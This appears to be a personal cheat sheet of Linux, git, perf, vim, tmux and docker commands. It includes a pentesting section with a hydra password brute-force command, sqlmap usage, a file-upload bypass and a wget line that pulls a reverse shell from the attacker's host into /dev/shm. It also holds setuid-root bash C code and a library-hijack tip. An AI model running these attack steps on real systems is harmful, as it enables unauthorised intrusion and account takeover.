Useful tools
============

github-awesome
--------------

https://github.com/chubin/awesome-console-services
https://github.com/herrbischoff/awesome-command-line-apps#readme
https://github.com/agarrharr/awesome-cli-apps
https://github.com/awesome-lists/awesome-bash
https://github.com/alebcay/awesome-shell  -- AWESOME!!!!
https://github.com/vinta/awesome-python

Hacking resources
-----------------

https://github.com/mzet-/linux-exploit-suggester
https://github.com/jondonas/linux-exploit-suggester-2
https://github.com/InteliSecureLabs/Linux_Exploit_Suggester

How2
----
git clone https://github.com/VladimirMikulic/how2
or git@github.com:bodgergely/how2.git
sudo npm i -g ./how2

History (hstr)
--------------
sudo add-apt-repository ppa:ultradvorka/ppa && sudo apt-get update && sudo apt-get install hstr && hstr --show-configuration >> ~/.bashrc && . ~/.bashrc

Jump (jump to directory)
------------------------
https://github.com/gsamokovarov/jump

go get github.com/gsamokovarov/jump
eval "$(jump shell)"
or 
jump shell >> ~/.bashrc

CookieCutter
------------

Generate templates for projects based on language

Terminal Color database
-----------------------

bash -c  "$(wget -qO- https://git.io/vQgMr)"

Digital Ocean cmd line
----------------------
https://github.com/omgimanerd/doclt
npm install -g doclt
doclt


Git
---

To tell your current branch to start tracking another remote branch:
git branch -u origin/dev
To change the default upstream branch:
git branch --set-upstream-to=origin/master

Git patches
-----------

https://stackoverflow.com/questions/28192623/create-patch-or-diff-file-from-git-repository-and-apply-it-to-another-different

To create patches for the last 2 commits:
git format-patch -2
git format-patch -2 --stdout > /tmp/patch
Output 11 patch lists starting from a certain commit:
git format-patch -11 57abff067a084889b6e06137e61a3dc3458acd56

To apply patch:
git am <star>.patch   --- <star> means the asterix here just cannot use with markdown
git am < /tmp/patch

Or use git diff

git diff tag1..tag2 > mypatch.patch
git apply mypatch.patch

Git log
-------
See changes between tags:
git log tag..tag

Cheatsheet:
https://devhints.io/git-log


Git statistics
--------------

About developer performance:
Number of lines added/removed and diff:

git log --author="Greg Bod" --pretty=tformat: --numstat | awk '{ add += $1; subs += $2; } END { printf "added lines: %s removed lines: %s total lines: %s\n", add, subs, add-subs }'

Total number of lines added by a developer on master branch?

git checkout master
git log --author="Greg Bod" --pretty=tformat: --numstat | awk '{ add += $1; } END { printf "added lines: %s\n", add }'




Git diff - to see changes
--------

See the diff between two branches on a given directory path:
git diff --stat torvalds/master tip/master ./kernel/sched/

To see files changed:
git diff --stat torvalds/master tip/master ./kernel/sched/

Compare the parent of a commit with the commit - basically to diff a commit with the previous one
^ - means parent
git diff 57abff067a084889b6e06137e61a3dc3458acd56^ 57abff067a084889b6e06137e61a3dc3458acd56

Can also use rev~3, which means rev^^^ - comparing against the 3rd parent to the commit
git diff 57abff067a084889b6e06137e61a3dc3458acd56~3 57abff067a084889b6e06137e61a3dc3458acd56


Git extras
----------
https://github.com/tj/git-extras/blob/master/Commands.md
sudo apt-get install git-extras

sudo npm install --global git-open

https://github.com/arzzen/git-quick-stats
git-quick-stats

Git Hub
-------
Makes checking out remote pull requests easy. Download a binary from here:
https://github.com/github/hub/releases

Then you can checkout a PR like below:
hub checkout https://github.com/neovim/neovim/pull/1820

Neovim(neovim)
==============

Transitioning from Vim
https://neovim.io/doc/user/nvim.html#nvim-from-vim
```
:call mkdir(stdpath('config'), 'p')
:exe 'edit '.stdpath('config').'/init.vim'
```
Then add the below to the contents of the file
set runtimepath^=~/.vim runtimepath+=~/.vim/after
```
let &packpath = &runtimepath
source ~/.vimrc
```


Basic tools
-----------
- whatis - Basic info about a program
- nmap, nc, socat
- vi, vim
- bash, tmux
- less, more, cat, most
- wc, sort, uniq, bc, column
- sed, awk
- xargs (xargs -i ls -lha {} or just xargs ls -lha)
- searchsploit
- dirbuster, dirb, gobuster, dirsearch
- sqlmap
- wfuzz
- burp or BurpSuiteCommunity, ProxyFoxy for firefox
- owasp-zap - it is like an open source Burp
- netstat
- ifconfig, ip, ss
- msfconsole 
- python for simple webserver
- gcc
- curl, wget, dig, nslookup, whois, host
- md5sum, base64, `base64 -d <file>`, `base64 <file>`
- radare2, xxd, hexdump, objdump
- tcpdump, Wireshark
- apt, dpkg, dpkg -l
- ssh - IMPORTANT to know well for tunnels
- date - to get time
- find, grep, fzf, locate
- env: prints the ENV vars, same as printenv
- hashid: Identify the different types of hashes used to encrypt data
- tee: write stdin to file and to stdout
- jq: JSON decoding, `jq . filename`
- ctags - https://github.com/universal-ctags/ctags-snap
- crontab - scheduled jobs
    - crobtab -l - list jobs


Network tools
-------------

- ifconfig
- ip
- iptables
- nethogs => analyze which processes are doing network IO bandwidth
- traceroute (with icmp option)
- curl
- wget
- nc

Ssh (ssh)
---------

ssh tunnel

The below will open a port locally on port 9000 and forward to the 10.10.10.73 which will then
send it to 10.10.10.75 port 80. This can be used to mask your IP and use 10.10.10.73 IP instead.
ssh -i box.key -L9000:10.10.10.75.80 10.10.10.73

flag: -D is dynamic port SOCKS proxy
use this to connect from another machine (https://www.youtube.com/watch?v=d2nVDoVr0jE&list=PLidcsTyj9JXK-fnabFLVEvHinQ14Jy5tf&index=3)

Edit /etc/proxychains.conf to tunnel your connection requests through proxy machine. See the above video.
Use socks5. (ie: socks5   127.0.0.1 1080)

Then you can do:
proxychains curl -k <URL-that-banned-you>


Curl
----
### Links:
This is very good:
https://curl.haxx.se/docs/sslcerts.html
### Cheatsheet:
https://devhints.io/curl

If certificate validation fails:
curl --insecure host:port

To send a HEAD request:
curl -I host:port

ls (#ls)
--------
Sort by size (for reverse use -Sr)
ls -S
Sort by last modified date or reverse (most recent last)
ls -t or ls -tr

Crontab
-------

- crontab -l  - to list cron jobs

xargs (#xargs)
--------------

find . -type d | xargs ls -lha
find . -type d | xargs -i ls -lha {}

find (#find)
------------

exclude directories (at any level name .git or .vs)
find . -name "*" -not -path "*.git/*" -not -path "*.vs/*"
find . -mindepth 2 -maxdepth 3

Find multiple patterns:
find . -iname "*.exe" -o -iname "*.dll" -o -iname "*.lnk"


printscreen
-----------

ctrl+shift+printscreen
then ctrl+v

Perf tools
----------
- schedtool - change scheduler policy of processes etc
- vmstat - cs field shows the context switches
- /usr/share/bcc/tools - eBPF profiling
- atop
- htop
- hardinfo - GTK UI based hardware information
- mpstat
- schedtool
- numastat, numactl
- kernelshark
- top
- ps
- pstree - awesome tool, to see child-parent relatinships
    $ ps auxf -> to print in tree style all processes
- powertop
- glances (https://github.com/nicolargo/glances)
- gprof
- perf
- /proc/loadavg (1,5,15min loadavg, running/total, last proc pid)
- /proc/<pid>/schedstat - task scheduling related statistics
- /proc/schedstat
- /proc/sched_debug

Perf commands
-------------
install perf with this
sudo apt install linux-tools-`uname -r`
https://github.com/brendangregg/perf-tools

Measure syscall rate:
sudo perf stat -e raw_syscalls:sys_enter -a -I 1000
sudo ~/bin/perf-tools/bin/funccount -i 1 -d 10 '[sS]y[sS]_*'

Perf Scheduler Analysis
-----------------------

Links:
http://www.brendangregg.com/blog/2017-03-16/perf-sched.html
http://www.brendangregg.com/perf.html#SchedulerAnalysis


irq, interrupts, softirq
-------------------------
- /proc/softirqs
- /proc/interrupts

bcc
---

bpf tools
on github iovisor/bcc

/usr/share/bcc/tools

bpftrace
--------

Measure time spent on ipset processing - place into file ipset.bt
```
kprobe:ip_set_test {
  @ipsets[pid] = arg0;
  @started[pid] = nsecs;
}
 
kretprobe:ip_set_test {
  $started = @started[pid];
  if ($started) {
    delete(@started[pid]);
 
    $ipset_id = @ipsets[pid];
 
    $duration_ns = nsecs - $started;
 
    @times_ns[(uint64) $ipset_id] += $duration_ns;
    @total_time_ns += $duration_ns;
 
    @total_count++;
  }
}
 
interval:s:10 {
  exit();
}
 
END {
  clear(@ipsets);
  clear(@started);
}
```

cpu info
--------
Use Awk to filter output from below commands

- cat /proc/cpuinfo
    - core id
    - processor
- lscpu
- cat /sys/devices/system/cpu/cpu0/topology/thread_siblings_list  - to see which hardware threads share a given cpu
    0, 4

ls /sys/devices/system/cpu/


cpu accounting, scheduler stats
-------------------------------

Files and directories under:
/sys/fs/cgroup/cpu,cpuacct/

or

/proc/sys/kernel/sched_*

while true; do echo $(date '+%Y-%m-%dT%H:%M:%S') $(cat /sys/fs/cgroup/unified/cpu.pressure | awk -F= '{ print $NF }'); sleep 1; done | awk -W interactive 'BEGIN { prev = 0; } { curr = $2; if (prev > 0) { printf("%s %7.2f ms\n", $1, (curr - prev) / 1e3); }; prev = curr; }'

schedstat
---------
Doc: https://www.kernel.org/doc/Documentation/scheduler/sched-stats.txt

System wide schedstat:
cat /proc/schedstat

Process schedstat:
$ cat /proc/166976/schedstat
3635064734 423220815 40840

     1) time spent on the cpu
     2) time spent waiting on a runqueue
     3) # of timeslices run on this cpu

Process's all threads listed under this and those have shcedstat 
/proc/166976/task/*

cat /proc/166976/task/166983/schedstat

sched stat interactive:
while true; do echo $(date '+%Y-%m-%dT%H:%M:%S') $(for pid in $(cat /sys/fs/cgroup/systemd/system.slice/rsyslog.service/tasks); do cat /proc/$pid/schedstat | awk '{ print $2 }'; done | awk '{ s += $1 / 1e6 } END { printf("%.2f\n", s) }'); sleep 1; done | awk -W interactive 'BEGIN { prev = 0; } { curr = $2; if (prev > 0) { printf("%s %7.2f ms\n", $1, (curr - prev)); }; prev = curr; }'

Procfs
------
/proc/<pid>/status - lots of process information
/proc/<pid>/task   - all the threads belonging to the pid group

taskset, cpu affinity
---------------------

TO see the cpu affinity of a given process/thread:
$ taskset -p <pid>

psi, pressure stall information
-------------------------------

$ ls /proc/pressure/
cpu  io  memory
$ cat /proc/pressure/cpu
some avg10=0.00 avg60=0.04 avg300=0.05 total=1107850106

htop
----
F1 - help
Shift+H - show/hide user threads
Shift+K - show/hide kernel threads
Shift-P - cpu sort
Shift-M - mem sort
https://peteris.rocks/blog/htop/
https://www.maketecheasier.com/power-user-guide-htop/

mpstat - Report processors related statistics
------


schedtool - query and set CPU scheduling parameters
---------

hardinfo - great UI hardware and resource info app
--------


sar - Collect, report, or save system activity information
---

pgpgin/s
                     Total number of kilobytes the system paged in from disk per second.

              pgpgout/s
                     Total number of kilobytes the system paged out to disk per second.

              fault/s
                     Number of page faults (major + minor) made by the system per second.  This is not
                     a  count  of  page  faults  that  generate  I/O,  because some page faults can be
                     resolved without I/O.

              majflt/s
                     Number of major faults the system has made per second, those which have  required
                     loading a memory page from disk.

              pgfree/s
                     Number of pages placed on the free list by the system per second.

              pgscank/s
                     Number of pages scanned by the kswapd daemon per second.

              pgscand/s
                     Number of pages scanned directly per second.

              pgsteal/s
                     Number of pages the system has reclaimed from cache (pagecache and swapcache) per
                     second to satisfy its memory demands.




top
---

STAT meaning:
PROCESS STATE CODES
       Here are the different values that the s, stat and state output specifiers (header "STAT" or "S") will display to describe the state of a process:
       D    uninterruptible sleep (usually IO)
       R    running or runnable (on run queue)
       S    interruptible sleep (waiting for an event to complete)
       T    stopped, either by a job control signal or because it is being traced.
       W    paging (not valid since the 2.6.xx kernel)
       X    dead (should never be seen)
       Z    defunct ("zombie") process, terminated but not reaped by its parent.

       For BSD formats and when the stat keyword is used, additional characters may be displayed:
       <    high-priority (not nice to other users)
       N    low-priority (nice to other users)
       L    has pages locked into memory (for real-time and custom IO)
       s    is a session leader
       l    is multi-threaded (using CLONE_THREAD, like NPTL pthreads do)
       +    is in the foreground process group.

Binary analysis
---------------
binwalk, xxd, hexdump, obnjdump, radare2, strings
exiftool - inspect image
ldd - list all linked libraries
ldconfig - configure dynamic run time linker (/etc/ld.so.conf.d)
    - configures the location of dynamic libraries to look at
    - we can change the dynamic library binding by manipulating the binding path

Radare2
-------
a - analyze
aaa
afl - list functions
a? - get options for analyze
pdf @ main - print-disassemble-function main
pdc @ main - print-disass-C-like-decompile


Reckon tools
------------

- nmap -sC -sV -oA nmap <IP>
- dirb
    This tool enumerates url paths based on a wordlist
- dirbuster
- gobuster -u <URL> -w <path-to-worldlistfile> -o <outputfile>

- Worldlists:
    - /usr/share/wordlists/ on Kali
    - /usr/share/wordlists/dirbuster/directly-list-2.3-medium.txt
    - ~/workspace/hacking/wordlists/
    - `cewl` -> worlist generator based on spidering a website, wordlist can be used for john the ripper

- Burp Suite - get the Firefox plugin FoxyProxy to use it
    Proxy, Repeater (ctrl+r to send a capture to the repeater)

- joomscan: Joomla vulnerability scanner

- LinEnum: enumerate Linux vulnerablities #nice
    https://github.com/rebootuser/LinEnum.git
    - /opt/LinEnum/LinEnum.sh
        You can just spawn a simple HTTPServer on your pentest box and curl the script into the
            victim's machine
    - use spawn SimpleHTTPServer locally in a folder and place there LinEnum.sh and curl/wget it from
        remote machine (place it under /dev/shm in remote machine)

Nmap
----
nmap -sC -sV -oA nmap <IP>
Full TCP connect(-sT) scan when SYN scan can not be done. connect syscall is done with it.
SYN scan is usually the better option.
SYN scan (you send the initial SYN packet and then wait for receiving the SYN/ACK reply)
Firewalls are usually smart enough to block you if you do this often.
nmap -sC -sV -sT -oA nmap <IP>
nmap --script vuln -oA nmap_vuln <IP>

Gobuster
--------

# -t means 50 threads
gobuster -u <URL> -w ~/workspace/hacking/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

Also try flags (-k and -x)

Password Cracking
-----------------
If we have let's say an MD5 hash of a password we can use hashcat to try to crack it. Plus
we need a wordlist, like rockyou.txt

- john: John the Ripper
- cewl - to generate wordlist
- hashcat
- hydra, hydra-gtk

Hydra
-----

Warning: Lockout warning, running hydra can easily blacklist your IP!

SecLists is on GitHub
/usr/share/wordlists/SecLists/Passwords/rockyou-50.txt
which is the top 10 thousand pwds
or the bigger one
/usr/share/wordlists/rockyou.txt

hydra -l admin -P rockyou-50.txt 10.10.10.75 http-post-form "nibbleblog/admin.php:username=^USER^&password=^PASS^:Incorrect username"

the :Incorrect username tells hydra what the incorrect username+password looks like in the response

Metasploit
----------

- msfconsole
- msfdb run

Commands:
    - search progname
    - use <modulename>
    - info
    - show options
    - set RHOSTS 10.10.10.134
    - run


pwntools
--------

python library for CTF and hacking.

Web Application hacking
-----------------------

https://github.com/swisskyrepo/PayloadsAllTheThings

When filling out web forms we can capture that request with Burp.
Then copy the request to a file and use sqlmap to try and to sql injection.
For instance we try a login form, capture that and copy the request to login.req.

`sqlmap -r login.req --level 5 --risk 3`

- File upload explotiation is something should try first.
   Once we uploaded a file, we should guess the location of it by enumerating folders.
    Usually **/uploads or **/upload 
    
  File types to upload:
    - php scripts! They can give you a reverse shell. There is some github project
        which hosts php-reverse-shell.php or something like this. Of course
        it only works if the web app is coded in php. 
    - Usually app will check if the uploaded file is the type it expects(ie image, PNG, JPEG etc)
        We can fool it by setting http header Content-Type: image/png and also by prepending
        our php code with some PNG start bytes, so if Linux runs `file` on it, it will be
        fooled into believing it is image. (file checks the magic bytes)
        Note that Web App Firewalls will inspect the POST data much more deeply and will
           recognize that we try something fishy.
    - Reverse shell file upload

Subdomain enumerate
-------------------

Is good to see what subdomains were ever on a given domain.

Sublist3r:
https://github.com/aboul3la/Sublist3r

Web App Fuzzing
---------------
### wfuzz - Web app fuzzer !!! #nice 

    `wfuzz -c --hw 36 -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -d 'username=admin&password=FUZZ&submit=login' <URL>`

    The above wfuzz command will take every item from the above wordlist and subsitute with FUZZ.
    -d 'PAYLOAD' -> grab it via Burp, see what POST body is sent

    We can also fuzz cookies in the header for example. Not just the body.
      
    `wfuzz -c --hw 29 -w /usr/share/seclists/Passwords/darkweb2017-top1000.txt -H 'Cookie:password=FUZZ' <URL>`

We can also put the FUZZ into the URL param list!

/usr/share/seclists/Fuzzing




Security dumps, files, wordlists
--------------------------------

SecLists - Password dumps etc.
https://github.com/danielmiessler/SecLists
Kali: apt -y install seclists
    - /usr/share/seclists/

/usr/share/wordlists/rockyou.txt - 134MB file - over 14 million passwords


Burp Suite
----------

Add to scope the site you care about and remove from scope all the other unrelated sites.
Do the same in the HTTP History tab under the Proxy tab.

- Repeater tab:
    - We can change the request method to POST from GET and vica versa
    - Can do conversions, url encoding etc


SQL Injection
-------------

Examples:
   ' or '1'='1

Applications:
    - sqlmap
    

Misc
----

base64  
    this program can encode/decode to/from base64 encoding
    `echo <base64-encoded-string> | base64 -d`

`find /home -type f -printf "%f\t%p\t%u\t%g\t%m" -maxdepth=2`
    Print files, and print different properties of the files to a certain depth.

`dpkg -l` | grep -i <name-of-package-of-interest>
    dpkg -l: will list all the installed software packages
    

Exploit tools
-------------

- searchsploit
    Searches exploitdb to look for exploits for a given application version.
    searchsploit -x 11746.txt to open the exploit
    searchsploit -m 11746.txt to mirror(copy) the exploit

Reverse shells
--------------
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
- reverse shells:
    - python-pty-shells: just google it on GitHub:
        tcp_pty_backconnect.py

Injectable Web Exploit Code: /usr/share/laudanum/README   -- make sure to use this!!

- python2 -m SimpleHTTPServer
- python3 -m http.server
    These will spawn a simple webservers. This will allow us to download stuff from our machine to
        the machine where we placed the code executor php file. Just do a code execution of 
                wget <OUR-IP>:8000/tcp_pty_backconnect.py -O /dev/shm/.reverse_shell.py
        It is good practice to save a reverse shell to /dev/shm so it will not be saved to hard drive.

- `nc -nlvp <PORT>` to set up a listen "server" to accept incoming connections

- Once we uploaded the reverse shell using our simple http server, we do
      python tcp_pty_shell_handler.py -b <IP>:<PORT>
        then we execute the reverse shell on the remote machine and we get the shell.

- Nice real bash pty using python once you have a reverse shell using nc

    python -c 'import pty; pty.spawn("/bin/bash")'
    bash$ then you hit C-Z to put the connection to background
    $ stty raw -echo
    $ fg
    bash$
    
    And now you have a nice bash with good completion and input.


Vulnerabilities
---------------

Old linux kernel - DIRTY COW exploitable
MOTD - PAM - Pluggable Authentication Module (searchsploit motd)

DNS
---

Good guide on how DNS works in practice:
https://webhostinggeeks.com/guides/dns/

Tools:
    - nslookup, dig, host, dnsrecon

Usually on port 53 and UDP. If TCP then probably dns zone transfer is enabled.
    `dig axfr @<dnsserverIP>` - does zone transfer

Dig/dig
----

Trace the DNS name resolution process:
dig @1.1.1.1 index.hu +trace

```
$nslookup
> Server 10.10.10.29
Default server: 10.10.10.29
Address: 10.10.10.29#53
> 127.0.0.1
> 10.10.10.29
```

Networking stuff
================

netstat, ports, tcp, ip, tc
---------------------------

sudo netstat -ltup - listening ports
ip route show table local

ss - show sockets - another utility to investigate sockets 

ss -tuln          - -t: TCP, -u: UDP, -l: Listening, -n: do not resolve service names  

iptables
--------

Manipulate iptable rules. Chain of rules triggered when packet matches etc
man iptables

ipset
-----
ipset  is  used to set up, maintain and inspect so called IP sets in the Linux kernel. 

ip
--

show / manipulate routing, network devices, interfaces and tunnels

$ ip link 
$ ip route



tc - traffic control
--------------------

https://netbeez.net/blog/how-to-use-the-linux-traffic-control/
$ sudo apt-get install iproute

netem (Network Emulation)
-------------------------

https://wiki.linuxfoundation.org/networking/netem



Documentation tool
------------------

- CherryTree
    Very good at taking notes and organize in a hierarchical way.
    
    C-n: new node
    C-S-n: new child node

Bash
----

Learn bash:
http://www.tldp.org/LDP/abs/html/

Links:
https://www.linux.com/learn/intro-to-linux/2017/4/fabulous-bash-navigation-shortcuts
https://www.ostechnix.com/list-useful-bash-keyboard-shortcuts/
https://unix.stackexchange.com/questions/231605/search-for-a-previous-command-with-the-prefix-i-just-typed

cd ~ : to go to home dir
cd - : to go back to previous dir

history: get the command history
ctrl-u: clear stuff before cursor
ctrl-c: erase the command
ctrl-r: search history backward
ctrl-s: search histroy forward
ctrl-g: leave history mode
ctrl-e: go to end
ctrl-a: go to beginning
ctrl-p: prev command
ctrl-n: next command
alt-b: move bach one word
alt-f: move forward one word
ctrl-f: move one letter forward
ctrl-b: move one letter back
ctrl+left arrow: move bach one word
ctrl+right arrow: move forward one word

ctrl+x,ctrl+e: to edit current bash command in vim

alt+.: inserts the last "word" of the previous command at the cursor. Repeat it to get the last word from older commands. 
ctrl+/: undo previosuly typed word

ctrl+x + ctrl+e: Enter VIM to edit the current command!

Heredoc (heredoc)
=================
```
cat <<HEREDOC > $DIR/heredoc.txt
This is good
Yes very good
HEREDOC
```

Google Chrome
=============
https://support.google.com/chrome/answer/157179?hl=en-GB

A + e - open chrome menu
C + h - open history tab
C + j - open downloads tab
C+S+b - show/hide bookmarks toolbar
C+S+o - open bookmarks manager
S + Esc - chrome Task Manager



Lua
---

Lua in 15 minutes: http://tylerneylon.com/a/learn-lua/

Systemd
-------
https://www.linode.com/docs/quick-answers/linux/how-to-use-journalctl/

$ systemctl status network-manager.service
$ vim /lib/systemd/system/network-manager.service

View logs since last boot:
$ journalctl -b
View logs in reverse order:
$ journalctl -r
Up to specific time:
$ journalctl --since "2018-08-30 14:10:10"
Wait for events, watch journalctl:
$ journalctl -f
Show only kernel msgs
$ journalctl -k
Show a specified systemd unit:
$ journalctl -u name-of-the-unit-or-pattern


Tmux shortcuts
--------------

C-b + n : next tab
C-b + p : prev tab
C-b + % : split tab vertically
C-b + " : split tab horizontally
C-b + , : rename tab
C-b + x : kill tab
C-b + z : zoom/unzoom, basically means to maximize the current pane, restore view by pressing it again, very useful!!!
C-b + <bracket> : to escape the command line and scroll into the text buffer
    Once in the text buffer mode:
    - search up: '?'
    - search down: '/'
Also possible to copy the tmux window contents by simply highlighting using the mouse and releasing it and it will
    be copied to the clipboard

C-b + C + Arrow Keys : to resize the panes

alt-h - go to left pane
alt-l - go to right pane

alt-u - get into scrolling mode

Links:
https://www.bugsnag.com/blog/tmux-and-vim
https://pragprog.com/book/bhtmux/tmux
https://tmuxcheatsheet.com/
https://github.com/tmux-plugins/tpm     -- Tmux plugin manager
https://github.com/tmux-plugins         -- Tmux plugins

https://github.com/tmux-plugins/tmux-open -- open in vim the file
o - open selected file with vim

https://github.com/tmux-plugins/tmux-copycat - advanced searching in tmux
C-b + / - to do search (then press n for next and N for prev)
C-b + C-f - to search for files
C-b + C-u - URL search
Copy a highlighted match with hitting Enter

prefix + shift + p  - start logging with tmux-logging plugin

Apt, dpkg, package, apt-get
---------------------------

Links


[Ubuntu apt repo guide](https://help.ubuntu.com/community/Repositories)
[Create local apt repo](https://askubuntu.com/questions/170348/how-to-create-a-local-apt-repository)

gdb shortcuts
-------------

C-x + a - enter tui window/exit tui window
C-x + o - switch to next focus (focus cmd -> focus src)

Awk (#awk)
===

https://stackoverflow.com/questions/450799/shell-command-to-sum-integers-one-per-line
https://likegeeks.com/awk-command/

Sum numbers on each line the first element and save to file
    awk '{s+=$1} END {print s}' mydatafile

Last column (field):
awk -F'.' 'j{print $NF}'

First column:
awk '{print $1}'

Print all file extensions:
find . -type f | awk -F'.' '{print $NF}' | sort | uniq -c

Sed (#sed)
===

sed -e 's/few/asd/g' hello.txt

Python
======

navigate back and forth with C+p and C+n to get prev, next command
Better to use ipython for code completion


requests
--------
```
import requests
response = requests.get(url)  # GET request
reponse.text                  # grab the body
response = requests.head(url) # HEAD request
response.headers              # grab the headers
dir(response)                 # see what data, methods we have on this object

```

Virtual Host Routing
--------------------

Request going to the same IP but with different Host http header field will get routed to different
web sites.



Binary hacking
==============

1. Hijacking dynamic function calls #nice
    we can change the dynamic library path using ldconfig. Write our own lib with
        a hijacked function in it. For example our own printf. Then running ldconfig will
        point the executables to load our new library at run time. 
        Dynamic loader config is at: /etc/ld.so.conf.d/ and just create a new file with
        a folder in it where you have your own hijacker library with printf redefined.


Exploitable binary list
-----------------------

https://gtfobins.github.io/

    
Bash in C
---------
With root priviliges:
```
#include <stdlib.h>
extern int bash();

int bash() {
    setreuid(0, 0);
    execve("/bin/bash", NULL, NULL);
}
```

grep (#grep)
====
To output the match only (-oh), -E means extended regex
$ grep -oh -R -E "=\s+ngx\..*\." --include=*.lua .

Match the word between foo and bar
$ grep -oP 'foo \K\w+(?= bar)'

-o: match only
-i: case insensitive
-F: fixed-string (do not use regex when searching)
-v: invert match - show all not matching
-h: no filename
-l: show only filename
-a: equivalent to --text and --binary-files=text. To fix the issue of "Binary file matches."
    Process a binary file as if it were text



Vim (#vim)
===
:wq - write and quit
:q! - write and discard changes
:w  - save
C-s - save
:q - quit
:tabe - open new tab
:vs - open vertical split
:%s/foo/bar/g   - replace 'foo' with 'bar' globally
:%!xdd - invoke HEX editor

:help - invoke help on subject
r - replace character
a - insert mode, append after cursor
i - insert mode, before cursor
o - insert empty line below curr line
O - insert empty line above curr line
v - enter visual mode
p - paste clipboard
gt - go to next tab
C-h - go to left pane
C-l - go to right pane
C-k - go to up pane
C-j - go to down pane

C-d - go down by many lines
C-u - go up by many lines
cw - delete word starting from cursor (insert mode)
dw - delete word starting from cursor (normal mode)
ciw - delete word  (insert mode)
diw - delete word  (normal mode)
/ - search forward
? - search backwards
* - highlight words and cycle through occurences
n - jump to next occurence
N - jump to prev occurence
ff - yank current line (originally yy)
dd - delete line
cc - delete line and insert mode
S-a - jump to end in insert mode 
S-d - delete up to end of line from current cursor pos
S-c - delete up to end of line from current cursor pos and insert mode
zz  - center view on current line
Tab - go forward to cursor pos
C-o - go back to prev cursor pos
C-] - go to tag
:tag NameOfTag  - go to tag
gg - jump to top
S-g - jump to buttom
$ - jump end of line
0 - jump beginning of line
u - undo
C-r - redo
,-t - Tagbar
:tag <TagName> - jump to tag name
:YcmCompleter GoTo - jump to tag
,-nt - Nerdtree
Nerdtree:
s - open file in vertical split
i - open file in horizontal split
m - the make changes in the directory
show current file in NT
nmap <silent><leader>nf :NERDTreeFind<CR>
Eof Nerdtree
,-f - grep
,vv - grep for word under cursor (EasyGrep) search word
,-w - easymotion forward
,-b - easymotion backward
,q - quick open search results
,gb - GitBlame (fugitive - git)
Recording:
    - q-<alphanum>
    - do your things to be recorded
    - press q
    - apply the recording with @-<alphanum>, or simply @-@ 
. - to apply prev command
C-v - block select mode
Changing a block selection:
    - C-v to block select text area
    - hit c to get into insert mode
    - Write your change
    - escape from insert mode -> replaces with your text all block selection

zo - expand/open the block - unhide contents
zc - close the block

Move windows/panes:
Ctrl W + L - Move the current window to the "far right"
Ctrl W + H - Move the current window to the "far left"
Ctrl W + J - Move the current window to the "very bottom"
Ctrl W + K - Move the current window to the "very top"

Quit shortcut - save and quit:
:x
or
ZZ

Quit shortcut - quit/exit without saving:
ESC Z Q

Using vim for c++(cpp) dev:
https://idie.ru/posts/vim-modern-cpp

Ruler/vertical line/column to visually see the border on a line.
:set colorcolumn=80


RipGrep, ripgrep, Ripgrep
=========================

Search for int main() in C files, globbing
`
rg -e ".*int\w+main\w*\(" -g "*.c"
`

exclude file patterns: -g \!<pattern1> -g \!<pattern2>
`
rg -g \!*.wixobj -g \!*.wxs 833378FE-1986-46BA-9B4E-F8F1DEBC986F
`

print the filename on the same line as search hit:
`--no-heading`

include binary files:
`--binary`

case insensitive:
-i

Compression/decompression/zip
=============================

7zip

7z x -o<OUT_FOLDER> stuff.zip

vscode VSCode
=============
```
C+b - minimize side panel (like search and file navigator)
C+S+p - command select (select a command from here - very useful)
C+p - select a file to open
C+n - new file
C+w - close window
C+' - maximize terminal
C+` - open/hide terminal view
C+S+n - new vscode window
A+F4 - close vscode window (the whole app) - this is more a universal ubuntu thing
C+h,j,k,l - to move around in the windows
S+A+right-arrow - to select word under cursor!!!
```

gcc
---

Sharedlib:
    gcc -shared -fPIC -o libbash.so bash.c

gdb
===
https://ftp.gnu.org/old-gnu/Manuals/gdb/html_node/gdb_57.html
set print array on
set print pretty on
layout split (asm + src)
Ctrl-x + a  - enter tui graphical mode
focus cmd
focus src
Can focus with shortcut: Ctrl-x + o
apropos REGEX - get help
help


GDB python API:
---------------
http://blog.scottt.tw/2012/01/exploring-gdb-python-api-with-ipython_31.html

example:
t.py
```
import gdb
gdb.execute('file /bin/cat')
o = gdb.execute('disassemble exit', to_string=True)
print(o)
gdb.execute('quit')
```
```
gdb -x t.py
```


Kernel debugging
================

ftrace
------
- trace-cmd
- kernelshark

Kernel modules
==============
$ lsmod
$ ls /lib/modules/`uname -r`/kernel

Kernel symbols
==============

cat /proc/kallsyms


Kubernetes
==========

alias k=kubectl
k get pods
k cluster-info

Docker
======

Post install steps:

$ sudo groupadd docker
$ sudo usermod -aG docker $USER
Verify:
$ docker run hello-world

$ sudo systemctl enable docker

Enter into a bash by creating a container from an image:
$ docker run -ti --entrypoint=/bin/bash ubuntu:latest -i

Enter into bash on a running container:
$ docker exec -it $CONTAINERID /bin/bash

Docker-Compose
--------------

$ docker-compose up

Filesystem
==========

sudo apt install xfsprogs
$ mkfs.xfs
$ mkfs.ext4

Create ext4/xfs RAM filesystem:
https://unix.stackexchange.com/questions/401295/how-can-i-create-an-ext4-ramdisk

mkdir /mnt/ramdisk
mount -t ramfs ramfs /mnt/ramdisk
dd if=/dev/zero of=/mnt/ramdisk/ext4.image bs=1M count=512
mkfs.ext4 /mnt/ramdisk/ext4.image
mkdir /mnt/ext4ramdisk
mount -o loop /mnt/ramdisk/ext4.image /mnt/ext4ramdisk

Disk/harddrive/filesystem utilities
-----------------------------------
$ parted
$ fdisk
Use below to get filesystems mount points/ sizes
$ df -Th        - Disk space free
$ du -c         - Disk usage per dirs
$ lsblk
$ findmnt
$ fsck
$ mke2fs - create ext2/3/4 file systems
$ fstab
$ blkid
$ lspci - PCI device discovery


Windows Kernel
==============

## slow kernel mode debugging (#kerneldebugging)

Use VirtualKD-Redux! Not the original one
https://github.com/4d61726b/VirtualKD-Redux
https://github.com/4d61726b/VirtualKD-Redux/issues/2

https://github.com/4d61726b/VirtualKD-Redux/blob/master/VirtualKD-Redux/Docs/Tutorial.md

https://sysprogs.com/legacy/virtualkd/

Explained here:
https://reverseengineering.stackexchange.com/questions/16588/faster-kernel-debugging-for-windows
https://reverseengineering.stackexchange.com/questions/16209/slow-kernel-dbg-with-virtualbox-and-windbg/16213
https://reverseengineering.stackexchange.com/questions/11914/advice-about-first-steps-on-reversing-windows-kernel

## Using VirtualKD-Redux

